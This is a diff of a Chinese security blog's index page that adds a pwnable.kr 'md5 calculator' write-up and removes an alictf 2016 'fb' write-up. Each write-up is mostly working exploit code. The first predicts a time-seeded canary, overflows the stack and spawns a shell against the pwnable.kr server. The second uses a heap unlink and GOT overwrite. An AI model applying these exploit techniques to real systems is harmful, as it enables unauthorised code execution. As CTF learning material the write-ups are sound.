@@ -432,6 +432,136 @@
             
               
                 
+                <a class="post-title-link" href="/2016/08/09/pwnable-rookiss-md5-calculator/" itemprop="url">
+                  pwnable.kr-rookiss-md5-calculator
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-08-09T00:00:00+08:00" content="2016-08-09">
+              2016-08-09
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/09/pwnable-rookiss-md5-calculator/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/09/pwnable-rookiss-md5-calculator/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="Conclusion">Conclusion</h1><p>之前第一次做没做出来，参考了<a href="https://gist.github.com/ihciah/948b37ab7587c3f70268">@ihc童鞋</a>的题解，今天又重新做了一次。</p>
+<p>这个程序的bug出在<code>my_hash</code>函数的返回值泄露了<strong>canary</strong>的信息，并且<code>process_hash</code>函数存在栈上的缓冲区溢出</p>
+<p>要泄露<strong>canary</strong>的信息，关键在于程序中的<code>srand(time(0));</code>。只要在本地用和服务器同样的时间戳作为seed，就可以通过程序返回的<strong>captcha</strong>来算出<strong>canary</strong>。关于服务器的时间戳，我也是尝试了下，发现跟本机上跟服务器上差了不到10秒，再考虑到网络延时，所以对本机的时间戳叠加了个-10~10的随机数</p>
+<p>搞定了canary之后，后面的就很简单了</p>
+<h1 id="Trick">Trick</h1><ul>
+<li>不同函数的canary可能是相同的，可以通过泄露前面调用的函数的canary，然后用它来覆盖后面调用的函数的canary</li>
+</ul>
+<h1 id="Exploit">Exploit</h1><h2 id="exp-py">exp.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, base64, ctypes, time, urllib2, random</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./hash'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span></span><br><span class="line">    <span class="comment"># leak info</span></span><br><span class="line">    leak    = os.popen(<span class="string">'./leak '</span> + str(int(time.time()) + random.randint(-<span class="number">10</span>, <span class="number">10</span>))).read().split(<span class="string">'*'</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">    leak    = [int(l) <span class="keyword">for</span> l <span class="keyword">in</span> leak]</span><br><span class="line">    io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># calc canary</span></span><br><span class="line">    io.read_until(<span class="string">'input captcha : '</span>)</span><br><span class="line">    captcha = int(io.read_line()[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    canary  = captcha - leak[<span class="number">1</span>] - leak[<span class="number">2</span>] + leak[<span class="number">3</span>] - leak[<span class="number">4</span>] - leak[<span class="number">5</span>] + leak[<span class="number">6</span>] - leak[<span class="number">7</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] leak canary : '</span> + hex(ctypes.c_uint32(canary).value)</span><br><span class="line"></span><br><span class="line">    io.writeline(str(captcha))</span><br><span class="line">    io.read_until(<span class="string">'Encode your data with BASE64 then paste me!'</span>)</span><br><span class="line"></span><br><span class="line">    plt_system  = <span class="number">0x8048880</span></span><br><span class="line">    adr_gbuf    = <span class="number">0x804b0e0</span></span><br><span class="line"></span><br><span class="line">    payload  = <span class="string">'A'</span> * <span class="number">0x200</span></span><br><span class="line">    payload += l32(canary)</span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">0xc</span></span><br><span class="line">    payload += l32(plt_system)</span><br><span class="line">    payload += l32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload += l32(adr_gbuf + <span class="number">0x2d1</span>)</span><br><span class="line"></span><br><span class="line">    io.writeline(base64.b64encode(payload) + <span class="string">'A/bin/sh'</span>)</span><br><span class="line">    io.interact()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    exp(target)</span><br></pre></td></tr></table></figure>
+<h2 id="leak-c">leak.c</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">8</span>];</span><br><span class="line">    srand(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">for</span>(; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        a[i] = rand();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d*"</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/08/09/pwnable-rookiss-md5-calculator/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/08/08/pwnable-rookiss-alloca/" itemprop="url">
                   pwnable.kr-rookiss-alloca
                 </a>
@@ -798,135 +928,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/31/alictf-qual-2016-fb/" itemprop="url">
-                  alictf-qual-2016-fb
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-31T00:00:00+08:00" content="2016-07-31">
-              2016-07-31
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/31/alictf-qual-2016-fb/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/31/alictf-qual-2016-fb/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_amd64</p>
-</blockquote>
-<h1 id="Conclusion">Conclusion</h1><p>练习用，第一次做<code>poison-null-byte</code>的题目，实现unlink后没有思路了，因为<code>show_message</code>没有实现，没有想到如何泄露libc，后来看了<strong>@flappypig</strong>战队的writeup，学到了一个用<code>printf</code>来泄露栈上的<code>libc_start_main_ret</code>的思路</p>
-<h1 id="Trick">Trick</h1><ul>
-<li><code>poison-null-byte</code> + <code>unlink</code></li>
-<li>替换got表<code>free</code>函数地址为<code>printf</code>函数plt地址，然后通过delete来泄露栈上的libc函数地址</li>
-</ul>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./fb_541e262e8cef6f48795a91cb1c17ac0b'</span></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line"><span class="comment"># io.gdb_hint([0x400cdb]) # finish init</span></span><br><span class="line">io.gdb_hint([<span class="number">0x400ce7</span>]) <span class="comment"># finish set</span></span><br><span class="line"><span class="comment"># io.gdb_hint([0x400cf3]) # finish delete</span></span><br><span class="line"><span class="comment"># io.gdb_hint([0x400cdb, 0x400ce7, 0x400cf3])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_message</span><span class="params">(len)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Input the message length:'</span>)</span><br><span class="line">    io.writeline(str(len))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_message</span><span class="params">(idx, payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Input the message index:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.read_until(<span class="string">'Input the message content:'</span>)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_message</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Input the message index:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct message&#123;</span></span><br><span class="line"><span class="comment">#     void *addr;</span></span><br><span class="line"><span class="comment">#     long length;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x6020b4: num of message(0 ~ 15)</span></span><br><span class="line"><span class="comment"># 0x6020c0: struct message[]</span></span><br><span class="line"></span><br><span class="line">chunk0      = <span class="number">0x6020c0</span></span><br><span class="line">got_free    = <span class="number">0x602018</span></span><br><span class="line">plt_printf  = <span class="number">0x4006e0</span></span><br><span class="line"></span><br><span class="line">init_message(<span class="number">0xf8</span>)</span><br><span class="line">init_message(<span class="number">0xf8</span>)</span><br><span class="line">init_message(<span class="number">0xf8</span>)</span><br><span class="line">init_message(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk  =   l64(<span class="number">0x100</span>)</span><br><span class="line">fake_chunk  +=  l64(<span class="number">0x101</span>)</span><br><span class="line">fake_chunk  +=  l64(chunk0 - <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">fake_chunk  +=  l64(chunk0 - <span class="number">0x8</span> * <span class="number">2</span>)</span><br><span class="line">fake_chunk  =   fake_chunk.ljust(<span class="number">0xf0</span>, <span class="string">'A'</span>)</span><br><span class="line">fake_chunk  +=  l64(<span class="number">0xf0</span>)</span><br><span class="line">set_message(<span class="number">0</span>, fake_chunk)</span><br><span class="line">delete_message(<span class="number">1</span>)</span><br><span class="line">set_message(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">0x18</span> + l64(got_free) + l64(<span class="number">0xf8</span>))</span><br><span class="line">set_message(<span class="number">0</span>, l64(plt_printf)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">set_message(<span class="number">2</span>, <span class="string">'%17$lx'</span>)</span><br><span class="line"></span><br><span class="line">delete_message(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">adr_libc_start_main = int(io.read_until(<span class="string">'Done'</span>)[<span class="number">0</span>:-<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">off_libc_start_main = <span class="number">0x21ec5</span></span><br><span class="line">libc_base           = adr_libc_start_main - off_libc_start_main</span><br><span class="line">off_system          = <span class="number">0x46640</span></span><br><span class="line">adr_system          = libc_base + off_system</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]libc base : %d'</span> % libc_base</span><br><span class="line"></span><br><span class="line">set_message(<span class="number">0</span>, l64(adr_system)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">set_message(<span class="number">3</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete_message(<span class="number">3</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-<h1 id="Reference">Reference</h1><p><a href="https://drive.google.com/file/d/0B0BNOZmT4f4kVFZyajNyblU3MVE/view" target="_blank" rel="external">https://drive.google.com/file/d/0B0BNOZmT4f4kVFZyajNyblU3MVE/view</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -972,7 +973,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">31</span>
+              <span class="site-state-item-count">32</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
